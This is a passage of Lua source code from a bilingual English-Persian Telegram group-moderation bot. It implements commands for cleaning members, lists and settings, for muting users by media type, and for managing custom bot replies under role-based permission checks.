      end
      if (matches[2] == "deleted" or matches[2] == "\216\175\219\140\217\132\219\140\216\170 \216\167\218\169\216\167\217\134\216\170 \217\135\216\167") and msg.to.type == "channel" then
        function check_deleted(A, B)
          for k, v in pairs(B.members_) do
            function clean_cb(A, B)
              if not B.first_name_ then
                kick_user(B.id_, msg.to.id)
              end
            end
            tdcli.getUser(v.user_id_, clean_cb, nil)
          end
          if not lang then
            tdcli.sendMessage(msg.to.id, msg.id, 1, "*Deleted Accounts has been removed from group*", 1, "md")
          else
            tdcli.sendMessage(msg.to.id, msg.id, 1, "\216\175\219\140\217\132\219\140\216\170 \216\167\218\169\216\167\217\134\216\170 \217\135\216\167 \216\167\216\178 \218\175\216\177\217\136\217\135 \216\173\216\176\217\129 \216\180\216\175\217\134\216\175", 1, "md")
          end
        end
        tdcli_function({
          ID = "GetChannelMembers",
          channel_id_ = getChatId(msg.to.id).ID,
          offset_ = 0,
          limit_ = 1000
        }, check_deleted, nil)
      end
      if matches[2] == "allowlist" or matches[2] == "\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178" then
        listWord = redis:smembers("AllowFrom~" .. msg.to.id)
        listUser = redis:smembers("AllowUserFrom~" .. msg.to.id)
        if #listWord == 0 and #listUser == 0 then
          if not lang then
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "*Groups Allow List is Empty!*", 1, "md")
          else
            return tdcli.sendMessage(msg.to.id, msg.id, 1, "\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178 \218\175\216\177\217\136\217\135 \216\174\216\167\217\132\219\140 \216\167\216\179\216\170!", 1, "md")
          end
        end
        redis:del("AllowFrom~" .. msg.to.id)
        redis:del("AllowUserFrom~" .. msg.to.id)
        if not lang then
          return tdcli.sendMessage(msg.to.id, msg.id, 1, "*Groups Allow list has been cleaned*", 1, "md")
        else
          return tdcli.sendMessage(msg.to.id, msg.id, 1, "\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178 \218\175\216\177\217\136\217\135 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175", 1, "md")
        end
      end
      if matches[2] == "blacklist" or matches[2] == "blocklist" or matches[2] == "\216\168\217\132\216\167\218\169 \217\132\219\140\216\179\216\170" or matches[2] == "\217\132\219\140\216\179\216\170 \217\133\216\179\216\175\217\136\216\175\219\140" then
        redis:del("GroupRecentBlocked:" .. msg.to.id)
        local cleanbl = function(ext, res)
          if tonumber(res.total_count_) == 0 then
            if not lang then
              return tdcli.sendMessage(ext.chat_id, ext.msg_id, 0, "*Groups Black List is Empty!*", 1, "md")
            else
              return tdcli.sendMessage(ext.chat_id, ext.msg_id, 0, "\217\132\219\140\216\179\216\170 \217\133\216\179\216\175\217\136\216\175\219\140 \218\175\216\177\217\136\217\135 \216\174\216\167\217\132\219\140 \217\133\219\140 \216\168\216\167\216\180\216\175!", 1, "md")
            end
          end
          local x = 0
          for x, y in pairs(res.members_) do
            x = x + 1
            tdcli.changeChatMemberStatus(ext.chat_id, y.user_id_, "Left", dl_cb, nil)
          end
          if not lang then
            return tdcli.sendMessage(ext.chat_id, ext.msg_id, 0, "*Groups Black List Has Been Cleaned!*", 1, "md")
          else
            return tdcli.sendMessage(ext.chat_id, ext.msg_id, 0, "\217\132\219\140\216\179\216\170 \217\133\216\179\216\175\217\136\216\175\219\140 \218\175\216\177\217\136\217\135 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175!", 1, "md")
          end
        end
        return tdcli.getChannelMembers(msg.to.id, 0, "Kicked", 200, cleanbl, {
          chat_id = msg.to.id,
          msg_id = msg.id
        })
      end
      if matches[2] == "bots" or matches[2] == "\216\177\216\168\216\167\216\170 \217\135\216\167" then
        function clbot(arg, data)
          for k, v in pairs(data.members_) do
            if v.user_id_ ~= bot.id then
              kick_user(v.user_id_, msg.to.id)
            end
          end
          if not lang then
            tdcli.sendMessage(msg.to.id, msg.id, 1, "*All Bots in Group Has Been Cleaned!*", 1, "md")
          else
            tdcli.sendMessage(msg.to.id, msg.id, 1, "\217\135\217\133\217\135 \216\177\216\168\216\167\216\170 \217\135\216\167 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \216\180\216\175\217\134\216\175!", 1, "md")
          end
        end
        tdcli.getChannelMembers(msg.to.id, 0, "Bots", 200, clbot, nil)
      end
      if matches[2] == "filterlist" or matches[2] == "\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177" then
        filterlist = redis:smembers("GroupFilterList:" .. msg.to.id)
        if #filterlist == 0 then
          if not lang then
            return "*Filtered words list* `is empty`"
          else
            return "\217\132\219\140\216\179\216\170 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \216\180\216\175\217\135 \216\174\216\167\217\132\219\140 \216\167\216\179\216\170"
          end
        else
          redis:del("GroupFilterList:" .. msg.to.id)
          if not lang then
            return "*Filtered words list* `has been cleaned`"
          else
            return "\217\132\219\140\216\179\216\170 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \216\180\216\175\217\135 \217\190\216\167\218\169 \216\180\216\175"
          end
        end
      end
      if matches[2] == "rules" or matches[2] == "\217\130\217\136\216\167\217\134\219\140\217\134" then
        if not redis:hget("GroupSettings:" .. msg.to.id, "rules") then
          if not lang then
            return "No *rules* available"
          else
            return "\217\130\217\136\216\167\217\134\219\140\217\134 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135 \216\171\216\168\216\170 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170"
          end
        end
        redis:hdel("GroupSettings:" .. msg.to.id, "rules")
        if not lang then
          return "*Group rules* `has been cleaned`"
        else
          return "\217\130\217\136\216\167\217\134\219\140\217\134 \218\175\216\177\217\136\217\135 \217\190\216\167\218\169 \216\180\216\175"
        end
      end
      if matches[2] == "welcome" or matches[2] == "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140" then
        if not redis:get("GroupWelcome" .. msg.to.id) then
          if not lang then
            return "*Welcome Message not set*"
          else
            return "\217\190\219\140\216\167\217\133 \216\174\217\136\216\180\216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \216\171\216\168\216\170 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170"
          end
        end
        redis:del("GroupWelcome" .. msg.to.id)
        if not lang then
          return "*Welcome message* `has been cleaned`"
        else
          return "\217\190\219\140\216\167\217\133 \216\174\217\136\216\180\216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \217\190\216\167\218\169 \216\180\216\175"
        end
      end
    end
    if (matches[1]:lower() == "clean" or matches[1] == "\217\190\216\167\218\169\216\179\216\167\216\178\219\140") and is_sudo(msg) and (matches[2] == "owners" or matches[2] == "\216\181\216\167\216\173\216\168\216\167\217\134" or matches[2] == "\216\181\216\167\216\173\216\168\219\140\217\134") then
      if next(data[tostring(chat)].owners) == nil then
        if not lang then
          return "*No* *owners* `in this group`"
        else
          return "\216\181\216\167\216\173\216\168\219\140 \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135 \216\167\217\134\216\170\216\174\216\167\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170"
        end
      end
      for k, v in pairs(data[tostring(chat)].owners) do
        data[tostring(chat)].owners[tostring(k)] = nil
        save_data("./data/moderation.json", data)
      end
      if not lang then
        return "All *owners* `has been demoted`"
      else
        return "\216\170\217\133\216\167\217\133\219\140 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135 \216\170\217\134\216\178\219\140\217\132 \217\133\217\130\216\167\217\133 \216\180\216\175\217\134\216\175"
      end
    end
    if (matches[1]:lower() == "setname" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \217\134\216\167\217\133") and matches[2] and is_mod(msg) then
      local gp_name = matches[2]
      tdcli.changeChatTitle(chat, gp_name, dl_cb, nil)
    end
    if (matches[1]:lower() == "filterlist" or matches[1] == "\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177") and is_mod(msg) then
      return filter_list(msg)
    end
    if matches[1]:lower() == "modlist" or matches[1] == "\217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134" then
      return modlist(msg)
    end
    if (matches[1]:lower() == "ownerlist" or matches[1] == "\217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134") and is_owner(msg) then
      return ownerlist(msg)
    end
    if (matches[1]:lower() == "config" or matches[1] == "\218\169\216\167\217\134\217\129\219\140\218\175") and is_owner(msg) then
      return config(msg, "yes")
    end
    if (matches[1]:lower() == "settings" or matches[1] == "\216\170\217\134\216\184\219\140\217\133\216\167\216\170") and is_mod(msg) then
      return group_settings(msg, target)
    end
    if (matches[1]:lower() == "mute" or matches[1] == "\217\133\219\140\217\136\216\170") and is_mod(msg) then
      if redis:get("mute_time:" .. msg.to.id) then
        expire = tonumber(redis:get("mute_time:" .. msg.to.id)) * 60
      else
        expire = 86400
      end
      function SendMuteUser(ID, item, nameEN, nameFA)
        end_time = math.ceil(redis:ttl("mute" .. ID .. "from" .. msg.to.id .. item) / 60)
        if redis:get("mute" .. ID .. "from" .. msg.to.id .. item) then
          return SendStatus(msg.to.id, ID, [[
Already Muted
Msg: ]] .. nameEN .. [[

End Time: ]] .. end_time .. " Minutes", "\216\167\216\178 \217\130\216\168\217\132 \217\133\219\140\217\136\216\170 \216\168\217\136\216\175\n\217\134\217\136\216\185 \217\190\219\140\216\167\217\133: " .. nameFA .. "\n\217\190\216\167\219\140\216\167\217\134: " .. end_time .. " \216\175\217\130\219\140\217\130\217\135")
        else
          redis:setex("mute" .. ID .. "from" .. msg.to.id .. item, expire, true)
          Time = expire / 60
          return SendStatus(msg.to.id, ID, [[
Muted
Msg: ]] .. nameEN .. [[

End Time: ]] .. Time .. " Minutes", "\217\133\219\140\217\136\216\170 \216\180\216\175\n\217\134\217\136\216\185 \217\190\219\140\216\167\217\133: " .. nameFA .. "\n\217\190\216\167\219\140\216\167\217\134: " .. Time .. " \216\175\217\130\219\140\217\130\217\135")
        end
      end
      if matches[2] and matches[3] and not msg.reply_id then
        if matches[2] == "time" then
          number = tonumber(matches[3])
          if 1 > number then
            if not lang then
              return "*Please use a number bigger than* `1`"
            else
              return "\217\132\216\183\217\129\216\167 \216\185\216\175\216\175\219\140 \216\168\216\178\216\177\218\175 \216\170\216\177 \216\167\216\178 `1` \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            end
          end
          redis:set("mute_time:" .. msg.to.id, matches[3])
          if not lang then
            return "*Mute time has been changed to:* " .. matches[3] .. " Minutes"
          else
            return "\216\178\217\133\216\167\217\134 \217\133\219\140\217\136\216\170 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135: " .. matches[3] .. " \216\175\217\130\219\140\217\130\217\135"
          end
        end
        if isModerator(msg.to.id, matches[3]) then
          return NoAccess(msg.to.id)
        else
          if matches[2] == "sticker" or matches[2] == "\216\167\216\179\216\170\219\140\218\169\216\177" then
            SendMuteUser(matches[3], "sticker", "Sticker", "\216\167\216\179\216\170\219\140\218\169\216\177")
          end
          if matches[2] == "photo" or matches[2] == "\216\185\218\169\216\179" then
            SendMuteUser(matches[3], "photo", "Photo", "\216\185\218\169\216\179")
          end
          if matches[2] == "video" or matches[2] == "\217\129\219\140\217\132\217\133" then
            SendMuteUser(matches[3], "video", "Video", "\217\129\219\140\217\132\217\133")
          end
          if matches[2] == "voice" or matches[2] == "\216\181\216\175\216\167" then
            SendMuteUser(matches[3], "voice", "Voice", "\216\181\216\175\216\167")
          end
          if matches[2] == "audio" or matches[2] == "\216\162\217\135\217\134\218\175" then
            SendMuteUser(matches[3], "audio", "Audio", "\216\162\217\135\217\134\218\175")
          end
          if matches[2] == "gif" or matches[2] == "\218\175\219\140\217\129" then
            SendMuteUser(matches[3], "gif", "Gif", "\218\175\219\140\217\129")
          end
          if matches[2] == "cmds" or matches[2] == "\216\175\216\179\216\170\217\136\216\177\216\167\216\170" then
            SendMuteUser(matches[3], "cmds", "Cmds", "\216\175\216\179\216\170\217\136\216\177\216\167\216\170")
          end
        end
      elseif matches[2] and not matches[3] and msg.reply_id then
        function MutesCb(extra, result, success)
          user = result.sender_user_id_
          if isModerator(msg.to.id, user) then
            return NoAccess(msg.to.id)
          end
          if matches[2] == "sticker" or matches[2] == "\216\167\216\179\216\170\219\140\218\169\216\177" then
            SendMuteUser(user, "sticker", "Sticker", "\216\167\216\179\216\170\219\140\218\169\216\177")
          end
          if matches[2] == "photo" or matches[2] == "\216\185\218\169\216\179" then
            SendMuteUser(user, "photo", "Photo", "\216\185\218\169\216\179")
          end
          if matches[2] == "video" or matches[2] == "\217\129\219\140\217\132\217\133" then
            SendMuteUser(user, "video", "Video", "\217\129\219\140\217\132\217\133")
          end
          if matches[2] == "voice" or matches[2] == "\216\181\216\175\216\167" then
            SendMuteUser(user, "voice", "Voice", "\216\181\216\175\216\167")
          end
          if matches[2] == "audio" or matches[2] == "\216\162\217\135\217\134\218\175" then
            SendMuteUser(user, "audio", "Audio", "\216\162\217\135\217\134\218\175")
          end
          if matches[2] == "gif" or matches[2] == "\218\175\219\140\217\129" then
            SendMuteUser(user, "gif", "Gif", "\218\175\219\140\217\129")
          end
          if matches[2] == "cmds" or matches[2] == "\216\175\216\179\216\170\217\136\216\177\216\167\216\170" then
            SendMuteUser(user, "cmds", "Cmds", "\216\175\216\179\216\170\217\136\216\177\216\167\216\170")
          end
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_to_message_id_
        }, MutesCb, nil)
      end
    end
    if (matches[1]:lower() == "unmute" or matches[1] == "\216\168\216\177\216\175\216\167\216\180\216\170\217\134 \217\133\219\140\217\136\216\170") and is_mod(msg) then
      function SendMuteUser(ID, item, nameEN, nameFA)
        if not redis:get("mute" .. ID .. "from" .. msg.to.id .. item) then
          return SendStatus(msg.to.id, ID, [[
is Not Muted
Msg: ]] .. nameEN, "\217\133\219\140\217\136\216\170 \217\134\216\168\217\136\216\175\n\217\134\217\136\216\185 \217\190\219\140\216\167\217\133: " .. nameFA)
        else
          redis:del("mute" .. ID .. "from" .. msg.to.id .. item)
          return SendStatus(msg.to.id, ID, [[
Unmuted
Msg: ]] .. nameEN, "\216\175\219\140\218\175\217\135 \217\133\219\140\217\136\216\170 \217\134\219\140\216\179\216\170!\n\217\134\217\136\216\185 \217\190\219\140\216\167\217\133: " .. nameFA)
        end
      end
      if matches[2] and matches[3] and not msg.reply_id then
        if isModerator(msg.to.id, matches[3]) then
          return NoAccess(msg.to.id)
        else
          if matches[2] == "sticker" or matches[2] == "\216\167\216\179\216\170\219\140\218\169\216\177" then
            SendMuteUser(matches[3], "sticker", "Sticker", "\216\167\216\179\216\170\219\140\218\169\216\177")
          end
          if matches[2] == "photo" or matches[2] == "\216\185\218\169\216\179" then
            SendMuteUser(matches[3], "photo", "Photo", "\216\185\218\169\216\179")
          end
          if matches[2] == "video" or matches[2] == "\217\129\219\140\217\132\217\133" then
            SendMuteUser(matches[3], "video", "Video", "\217\129\219\140\217\132\217\133")
          end
          if matches[2] == "voice" or matches[2] == "\216\181\216\175\216\167" then
            SendMuteUser(matches[3], "voice", "Voice", "\216\181\216\175\216\167")
          end
          if matches[2] == "audio" or matches[2] == "\216\162\217\135\217\134\218\175" then
            SendMuteUser(matches[3], "audio", "Audio", "\216\162\217\135\217\134\218\175")
          end
          if matches[2] == "gif" or matches[2] == "\218\175\219\140\217\129" then
            SendMuteUser(matches[3], "gif", "Gif", "\218\175\219\140\217\129")
          end
          if matches[2] == "cmds" or matches[2] == "\216\175\216\179\216\170\217\136\216\177\216\167\216\170" then
            SendMuteUser(matches[3], "cmds", "Cmds", "\216\175\216\179\216\170\217\136\216\177\216\167\216\170")
          end
        end
      elseif matches[2] and not matches[3] and msg.reply_id then
        function MutesCb(extra, result, success)
          user = result.sender_user_id_
          if isModerator(msg.to.id, user) then
            return NoAccess(msg.to.id)
          end
          if matches[2] == "sticker" or matches[2] == "\216\167\216\179\216\170\219\140\218\169\216\177" then
            SendMuteUser(user, "sticker", "Sticker", "\216\167\216\179\216\170\219\140\218\169\216\177")
          end
          if matches[2] == "photo" or matches[2] == "\216\185\218\169\216\179" then
            SendMuteUser(user, "photo", "Photo", "\216\185\218\169\216\179")
          end
          if matches[2] == "video" or matches[2] == "\217\129\219\140\217\132\217\133" then
            SendMuteUser(user, "video", "Video", "\217\129\219\140\217\132\217\133")
          end
          if matches[2] == "voice" or matches[2] == "\216\181\216\175\216\167" then
            SendMuteUser(user, "voice", "Voice", "\216\181\216\175\216\167")
          end
          if matches[2] == "audio" or matches[2] == "\216\162\217\135\217\134\218\175" then
            SendMuteUser(user, "audio", "Audio", "\216\162\217\135\217\134\218\175")
          end
          if matches[2] == "gif" or matches[2] == "\218\175\219\140\217\129" then
            SendMuteUser(user, "gif", "Gif", "\218\175\219\140\217\129")
          end
          if matches[2] == "cmds" or matches[2] == "\216\175\216\179\216\170\217\136\216\177\216\167\216\170" then
            SendMuteUser(user, "cmds", "Cmds", "\216\175\216\179\216\170\217\136\216\177\216\167\216\170")
          end
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_to_message_id_
        }, MutesCb, nil)
      end
    end
    if matches[1]:lower() == "mymute" or matches[1] == "mm" or matches[1] == "\217\133\219\140\217\136\216\170 \217\133\217\134" then
      user = msg.from.id
      chat = msg.to.id
      sticker = math.ceil(redis:ttl("mute" .. user .. "from" .. chat .. "sticker") / 60)
      photo = math.ceil(redis:ttl("mute" .. user .. "from" .. chat .. "photo") / 60)
      video = math.ceil(redis:ttl("mute" .. user .. "from" .. chat .. "video") / 60)
      voice = math.ceil(redis:ttl("mute" .. user .. "from" .. chat .. "voice") / 60)
      audio = math.ceil(redis:ttl("mute" .. user .. "from" .. chat .. "audio") / 60)
      gif = math.ceil(redis:ttl("mute" .. user .. "from" .. chat .. "gif") / 60)
      cmds = math.ceil(redis:ttl("mute" .. user .. "from" .. chat .. "cmds") / 60)
      if 0 < sticker then
        if not lang then
          text1 = "*Mute Sticker:* `" .. sticker .. " Minutes`"
        else
          text1 = "*\217\133\219\140\217\136\216\170 \216\167\216\179\216\170\219\140\218\169\216\177:* `" .. sticker .. " \216\175\217\130\219\140\217\130\217\135`"
        end
      elseif not lang then
        text1 = "*Mute Sticker:* `Not Found!`"
      else
        text1 = "*\217\133\219\140\217\136\216\170 \216\167\216\179\216\170\219\140\218\169\216\177:* `\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!`"
      end
      if 0 < photo then
        if not lang then
          text2 = "*Mute Photo:* `" .. photo .. " Minutes`"
        else
          text2 = "*\217\133\219\140\217\136\216\170 \216\185\218\169\216\179:* `" .. photo .. " \216\175\217\130\219\140\217\130\217\135`"
        end
      elseif not lang then
        text2 = "*Mute Photo:* `Not Found!`"
      else
        text2 = "*\217\133\219\140\217\136\216\170 \216\185\218\169\216\179:* `\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!`"
      end
      if 0 < video then
        if not lang then
          text3 = "*Mute Video:* `" .. video .. " Minutes`"
        else
          text3 = "*\217\133\219\140\217\136\216\170 \217\129\219\140\217\132\217\133:* `" .. video .. " \216\175\217\130\219\140\217\130\217\135`"
        end
      elseif not lang then
        text3 = "*Mute Video:* `Not Found!`"
      else
        text3 = "*\217\133\219\140\217\136\216\170 \217\129\219\140\217\132\217\133:* `\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!`"
      end
      if 0 < voice then
        if not lang then
          text4 = "*Mute Voice:* `" .. voice .. " Minutes`"
        else
          text4 = "*\217\133\219\140\217\136\216\170 \216\181\216\175\216\167:* `" .. voice .. " \216\175\217\130\219\140\217\130\217\135`"
        end
      elseif not lang then
        text4 = "*Mute Voice:* `Not Found!`"
      else
        text4 = "*\217\133\219\140\217\136\216\170 \216\181\216\175\216\167:* `\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!`"
      end
      if 0 < audio then
        if not lang then
          text5 = "*Mute Audio:* `" .. audio .. " Minutes`"
        else
          text5 = "*\217\133\219\140\217\136\216\170 \216\162\217\135\217\134\218\175:* `" .. audio .. " \216\175\217\130\219\140\217\130\217\135`"
        end
      elseif not lang then
        text5 = "*Mute Audio:* `Not Found!`"
      else
        text5 = "*\217\133\219\140\217\136\216\170 \216\162\217\135\217\134\218\175:* `\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!`"
      end
      if 0 < gif then
        if not lang then
          text6 = "*Mute Gif:* `" .. gif .. " Minutes`"
        else
          text6 = "*\217\133\219\140\217\136\216\170 \218\175\219\140\217\129:* `" .. gif .. " \216\175\217\130\219\140\217\130\217\135`"
        end
      elseif not lang then
        text6 = "*Mute Gif:* `Not Found!`"
      else
        text6 = "*\217\133\219\140\217\136\216\170 \218\175\219\140\217\129:* `\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!`"
      end
      if cmds > 0 then
        if not lang then
          text7 = "*Mute Cmds:* `" .. cmds .. " Minutes`"
        else
          text7 = "*\217\133\219\140\217\136\216\170 \216\175\216\179\216\170\217\136\216\177\216\167\216\170:* `" .. cmds .. " \216\175\217\130\219\140\217\130\217\135`"
        end
      elseif not lang then
        text7 = "*Mute Cmds:* `Not Found!`"
      else
        text7 = "\217\133\219\140\217\136\216\170 \216\175\216\179\216\170\217\136\216\177\216\167\216\170: `\217\190\219\140\216\175\216\167 \217\134\216\180\216\175!`"
      end
      return text1 .. "\n" .. text2 .. "\n" .. text3 .. "\n" .. text4 .. "\n" .. text5 .. "\n" .. text6 .. "\n" .. text7
    end
    if (matches[1]:lower() == "setforcedinvite" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140") and is_owner(msg) then
      if 1 > tonumber(matches[2]) then
        if not lang then
          return "*Please Enter A Number Bigger Than* `0`"
        else
          return "\217\132\216\183\217\129\216\167 \219\140\218\169 \216\185\216\175\216\175 \216\168\216\178\216\177\218\175\216\170\216\177 \216\167\216\178 `0` \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175"
        end
      else
        redis:hset("GroupSettings:" .. msg.to.id, "ForcedInvite", tonumber(matches[2]))
        if not lang then
          return "*Number of Member For Forced Invite Has Been Changed To:* [`" .. matches[2] .. "`]"
        else
          return "\216\170\216\185\216\175\216\167\216\175 \216\185\216\182\217\136 \216\168\216\177\216\167\219\140 \216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135 [`" .. matches[2] .. "`]"
        end
      end
    end
    if (matches[1]:lower() == "addreply" or matches[1] == "\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \217\190\216\167\216\179\216\174") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      elseif redis:sismember("BotReply:" .. matches[2], matches[3]) then
        if not lang then
          return "*This reply is already added!*"
        else
          return " \216\167\219\140\217\134 \217\190\216\167\216\179\216\174 \217\130\216\168\217\132\216\167 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175\217\135 \216\167\216\179\216\170!"
        end
      elseif matches[3] == "ALL" or matches[3] == "\217\135\217\133\217\135" then
        if not lang then
          return "*This reply can not be added!*"
        else
          return "\216\167\219\140\217\134 \217\190\216\167\216\179\216\174 \217\134\217\133\219\140\216\170\217\136\216\167\217\134\216\175 \216\167\216\182\216\167\217\129\217\135 \216\180\217\136\216\175!"
        end
      else
        redis:sadd("BotReply:" .. matches[2], matches[3])
        if not lang then
          return "*Reply has been added*"
        else
          return "\217\190\216\167\216\179\216\174 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175"
        end
      end
    end
    if (matches[1]:lower() == "delreply" or matches[1]:lower() == "\216\173\216\176\217\129 \217\190\216\167\216\179\216\174") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      elseif redis:sismember("BotReply:" .. matches[2], matches[3]) then
        redis:srem("BotReply:" .. matches[2], matches[3])
        if not lang then
          return "*Reply has been deleted*"
        else
          return "\217\190\216\167\216\179\216\174 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\173\216\176\217\129 \216\180\216\175"
        end
      elseif matches[3] == "ALL" or matches[3] == "\217\135\217\133\217\135" then
        redis:del("BotReply:" .. matches[2])
        if not lang then
          return "*All replies of* {`" .. matches[2] .. "`} *has been deleted*"
        else
          return "\217\135\217\133\217\135 \217\190\216\167\216\179\216\174 \217\135\216\167\219\140 {`" .. matches[2] .. "`} \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\173\216\176\217\129 \216\180\216\175\217\134\216\175"
        end
      elseif not lang then
        return "*This reply is not added!*"
      else
        return "\216\167\219\140\217\134 \217\190\216\167\216\179\216\174 \216\167\216\182\216\167\217\129\217\135 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!"
      end
    end
    if (matches[1]:lower() == "allreply" or matches[1] == "\217\135\217\133\217\135 \217\190\216\167\216\179\216\174 \217\135\216\167\219\140") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      else
        ReplyHash = redis:smembers("BotReply:" .. matches[2])
        if #ReplyHash == 0 then
          if not lang then
            return "`Reply not found!`"
          else
            return "`\217\190\216\167\216\179\216\174 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175!`"
          end
        else
          function BotReplyMembers(msg)
            text = ""
            for k, v in pairs(ReplyHash) do
              text = text .. "" .. v .. "\n"
            end
            return text
          end
          if not lang then
            Messa = "*List of* {`" .. matches[2] .. [[
`} *Reply:*

]]
          else
            Messa = "\217\132\219\140\216\179\216\170 \217\190\216\167\216\179\216\174 \217\135\216\167\219\140 {`" .. matches[2] .. [[
`} :

]]
          end
          Words = BotReplyMembers(msg)
          return Messa .. "" .. Words
        end
      end
    end
    if (matches[1]:lower() == "replyaccess" or matches[1] == "\216\175\216\179\216\170\216\177\216\179\219\140 \217\190\216\167\216\179\216\174") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "botreply") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      else
        ReplyHash = redis:smembers("BotReply:" .. matches[2])
        if #ReplyHash == 0 then
          if not lang then
            return "`Reply not found!`"
          else
            return "`\217\190\216\167\216\179\216\174 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175!`"
          end
        elseif matches[3]:lower() == "sudo" or matches[3] == "\216\179\217\136\216\175\217\136" then
          redis:set("BotReplyAccess:" .. matches[2], "sudo")
          if not lang then
            return "{" .. matches[2] .. "} Access Changed To: " .. matches[3]
          else
            return "\216\175\216\179\216\170\216\177\216\179\219\140 {" .. matches[2] .. "} \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135: " .. matches[3]
          end
        elseif matches[3]:lower() == "owner" or matches[3] == "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135" then
          redis:set("BotReplyAccess:" .. matches[2], "owner")
          if not lang then
            return "{" .. matches[2] .. "} Access Changed To: " .. matches[3]
          else
            return "\216\175\216\179\216\170\216\177\216\179\219\140 {" .. matches[2] .. "} \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135: " .. matches[3]
          end
        elseif matches[3]:lower() == "moderator" or matches[3] == "\217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135" then
          redis:set("BotReplyAccess:" .. matches[2], "moderator")
          if not lang then
            return "{" .. matches[2] .. "} Access Changed To: " .. matches[3]
          else
            return "\216\175\216\179\216\170\216\177\216\179\219\140 {" .. matches[2] .. "} \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135: " .. matches[3]
          end
        elseif matches[3] == "0" then
          redis:del("BotReplyAccess:" .. matches[2])
          if not lang then
            return "{" .. matches[2] .. "} Access Changed To: All Users"
          else
            return "\216\175\216\179\216\170\216\177\216\179\219\140 {" .. matches[2] .. "} \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135: \217\135\217\133\217\135 \218\169\216\167\216\177\216\168\216\177\216\167\217\134"
          end
        elseif not lang then
          return [[
*Input is not correct!*
`sudo`/`owner`/`moderator`/`0`]]
        else
          return "\217\136\216\177\217\136\216\175\219\140 \216\181\216\173\219\140\216\173 \217\134\219\140\216\179\216\170!\n`\216\179\217\136\216\175\217\136`/`\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135`/`\217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135`/`0`"
        end
      end
    end
    lang = redis:get("gp_lang:" .. msg.chat_id_)
    sense = "sense:" .. msg.chat_id_
    data = load_data("./data/moderation.json")
